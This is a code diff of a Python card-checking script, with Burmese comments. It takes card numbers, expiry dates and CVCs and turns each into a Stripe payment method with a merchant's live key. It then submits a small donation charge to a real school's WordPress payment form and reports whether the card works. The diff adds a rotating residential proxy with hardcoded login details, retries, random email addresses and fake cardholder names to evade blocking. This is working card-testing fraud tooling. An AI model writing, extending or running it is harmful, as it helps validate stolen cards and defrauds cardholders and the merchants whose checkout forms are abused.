@@ -1,90 +1,168 @@
 import requests, re
 import random
-import string # Random စာလုံးတွေထုတ်ဖို့ ဒါလေးထပ်ထည့်ထားတယ်
+import string
+import time
+from requests.adapters import HTTPAdapter
+from urllib3.util.retry import Retry
+
+# ==========================================
+# 👇 PROXY SETTINGS (Mass Script မှ ယူထားသည်)
+# ==========================================
+PROXY_HOST = 'geo.g-w.info'
+PROXY_PORT = '10080'
+PROXY_USER = 'user-rL9mqeSecubayN9h-type-residential-session-r9z2b1dq-country-US-city-San_Francisco-rotation-15'
+PROXY_PASS = '4NvlmbUrwSPnf9r0'
+
+proxy_url = f"http://{PROXY_USER}:{PROXY_PASS}@{PROXY_HOST}:{PROXY_PORT}"
+proxies = {
+    'http': proxy_url,
+    'https': proxy_url
+}
 
 def Tele(ccx):
-	ccx = ccx.strip()
-	n = ccx.split("|")[0]
-	mm = ccx.split("|")[1]
-	yy = ccx.split("|")[2]
-	cvc = ccx.split("|")[3]
+    try:
+        # ကဒ်အချက်အလက် ခွဲထုတ်ခြင်း
+        ccx = ccx.strip()
+        n = ccx.split("|")[0]
+        mm = ccx.split("|")[1]
+        yy = ccx.split("|")[2]
+        cvc = ccx.split("|")[3]
 
-	if "20" in yy:  # Mo3gza
-		yy = yy.split("20")[1]
+        if "20" in yy:
+            yy = yy.split("20")[1]
 
-	r = requests.session()
+        # Random Email ဖန်တီးခြင်း
+        letters = string.ascii_lowercase + string.digits
+        random_name = ''.join(random.choice(letters) for i in range(10))
+        random_email = f"{random_name}@gmail.com"
 
-	random_amount1 = random.randint(1, 4)
-	random_amount2 = random.randint(1, 99)
+        # 🔥 RETRY SYSTEM (Connection ကျရင် ပြန်ချိတ်ဖို့)
+        session = requests.Session()
+        retry = Retry(
+            total=3, 
+            backoff_factor=1, 
+            status_forcelist=[500, 502, 503, 504]
+        )
+        adapter = HTTPAdapter(max_retries=retry)
+        session.mount('http://', adapter)
+        session.mount('https://', adapter)
+        session.proxies = proxies
 
-	# 🔥 Random Email Logic (ဒီမှာစပြီး ပြင်ထားတယ်) 🔥
-	# စာလုံး ၁၂ လုံးပါတဲ့ Random နာမည်တစ်ခု ဖန်တီးမယ်
-	letters = string.ascii_lowercase + string.digits
-	random_name = ''.join(random.choice(letters) for i in range(12))
-	random_email = f"{random_name}@gmail.com"
-	# ==========================================
+        # ==========================================
+        # Step 1: Create Payment Method (Stripe)
+        # ==========================================
+        headers = {
+            'authority': 'api.stripe.com',
+            'accept': 'application/json',
+            'accept-language': 'en-US,en;q=0.9',
+            'content-type': 'application/x-www-form-urlencoded',
+            'origin': 'https://js.stripe.com',
+            'referer': 'https://js.stripe.com/',
+            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-site',
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+        }
 
-	headers = {
-		'authority': 'api.stripe.com',
-		'accept': 'application/json',
-		'accept-language': 'en-US,en;q=0.9',
-		'content-type': 'application/x-www-form-urlencoded',
-		'origin': 'https://js.stripe.com',
-		'referer': 'https://js.stripe.com/',
-		'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
-		'sec-ch-ua-mobile': '?1',
-		'sec-ch-ua-platform': '"Android"',
-		'sec-fetch-dest': 'empty',
-		'sec-fetch-mode': 'cors',
-		'sec-fetch-site': 'same-site',
-		'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
-	}
+        # New API Key from Mass Script
+        data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F35d1c775d8%3B+stripe-js-v3%2F35d1c775d8%3B+card-element&key=pk_live_51LTAH3KQqBJAM2n1ywv46dJsjQWht8ckfcm7d15RiE8eIpXWXUvfshCKKsDCyFZG48CY68L9dUTB0UsbDQe32Zn700Qe4vrX0d'
 
-	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2Fc264a67020%3B+stripe-js-v3%2Fc264a67020%3B+card-element&key=pk_live_51HS2e7IM93QTW3d6EuHHNKQ2lAFoP1sepEHzJ7l1NWvDr7q2vEbmp3v5GM6gwdtgmO3HnEQ3JGeWtZJNXiNEd97M0067w1jUqv'
+        response = requests.post(
+            'https://api.stripe.com/v1/payment_methods',
+            headers=headers,
+            data=data,
+            timeout=60 
+        )
 
-	try:
-		response = requests.post(
-			'https://api.stripe.com/v1/payment_methods',
-			headers=headers,
-			data=data
-		)
-		pm = response.json()['id']
-	except:
-		return "Error Creating PM"
+        try:
+            json_response = response.json()
+        except:
+            return "Proxy Error (Invalid JSON) ❌"
 
-	headers = {
-		'Accept': 'application/json, text/javascript, */*; q=0.01',
-		'Accept-Language': 'en-US,en;q=0.9',
-		'Connection': 'keep-alive',
-		'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
-		'Origin': 'https://farmingdalephysicaltherapywest.com',
-		'Referer': 'https://farmingdalephysicaltherapywest.com/make-payment/',
-		'Sec-Fetch-Dest': 'empty',
-		'Sec-Fetch-Mode': 'cors',
-		'Sec-Fetch-Site': 'same-origin',
-		'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
-		'X-Requested-With': 'XMLHttpRequest',
-		'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
-		'sec-ch-ua-mobile': '?0',
-		'sec-ch-ua-platform': '"Linux"',
-	}
+        # 🔥 ERROR HANDLING (Stripe ကပြန်လာတဲ့ Error တွေကို ဖမ်းမယ်)
+        if 'error' in json_response:
+            code = json_response['error'].get('code')
+            if code == 'incorrect_number':
+                return "Invalid Card Number ❌"
+            elif code == 'invalid_number':
+                return "Invalid Card Number ❌"
+            elif code == 'invalid_expiry_month':
+                return "Invalid Expiry Date ❌"
+            elif code == 'invalid_cvc':
+                return "Invalid CVC ❌"
+            else:
+                return f"Stripe Error: {code} ❌"
 
-	data = {
-		'action': 'wp_full_stripe_inline_payment_charge',
-		'wpfs-form-name': 'Payment-Form',
-		'wpfs-form-get-parameters': '%7B%7D',
-		'wpfs-custom-amount-unique': '1',
-		'wpfs-custom-input[]': '13125550124',
-		# 🔥 ဒီနေရာမှာ Random Email ကို ထည့်လိုက်ပြီ 🔥
-		'wpfs-card-holder-email': random_email,
-		'wpfs-card-holder-name': 'Mr Z',
-		'wpfs-stripe-payment-method-id': f'{pm}',
-	}
+        if 'id' not in json_response:
+            return "Proxy Error (PM Failed) ❌"
+            
+        pm = json_response['id']
 
-	response = requests.post(
-		'https://farmingdalephysicaltherapywest.com/wp-admin/admin-ajax.php',
-		headers=headers,
-		data=data,
-	)
+        # ==========================================
+        # Step 2: Charge Request (New Site: texassouthernacademy.com)
+        # ==========================================
+        headers = {
+            'authority': 'texassouthernacademy.com',
+            'accept': 'application/json, text/javascript, */*; q=0.01',
+            'accept-language': 'en-US,en;q=0.9',
+            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+            'origin': 'https://texassouthernacademy.com',
+            'referer': 'https://texassouthernacademy.com/donation/',
+            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-origin',
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+            'x-requested-with': 'XMLHttpRequest',
+        }
 
-	return response.text
+        data = {
+            'action': 'wp_full_stripe_inline_donation_charge',
+            'wpfs-form-name': 'donate',
+            'wpfs-form-get-parameters': '%7B%7D',
+            'wpfs-custom-amount': 'other',
+            'wpfs-custom-amount-unique': '0.5', # Charge Amount $0.5
+            'wpfs-donation-frequency': 'one-time',
+            'wpfs-billing-name': '6',
+            'wpfs-billing-address-country': 'US',
+            'wpfs-billing-address-line-1': 'Street 2',
+            'wpfs-billing-address-line-2': '',
+            'wpfs-billing-address-city': 'New York',
+            'wpfs-billing-address-state': '',
+            'wpfs-billing-address-state-select': 'CA',
+            'wpfs-billing-address-zip': '10080',
+            'wpfs-card-holder-email': random_email,
+            'wpfs-card-holder-name': 'Min Thant',
+            'wpfs-stripe-payment-method-id': f'{pm}',
+        }
+
+        response = requests.post(
+            'https://texassouthernacademy.com/wp-admin/admin-ajax.php',
+            headers=headers,
+            data=data,
+            timeout=60
+        )
+        
+        try:
+            # Result ကိုယူမယ်
+            result = response.json().get('message', 'Unknown Response')
+            
+            # Response က Empty ဖြစ်နေရင် Text ကိုစစ်မယ်
+            if not result:
+                result = response.text
+                
+        except:
+            if "Cloudflare" in response.text or response.status_code == 403:
+                result = "IP Blocked by Site ❌"
+            else:
+                result = "Decline⛔"
+
+    except Exception as e:
+        result = f"Connection Failed (Retry Limit) ⚠️"
+        
+    return result
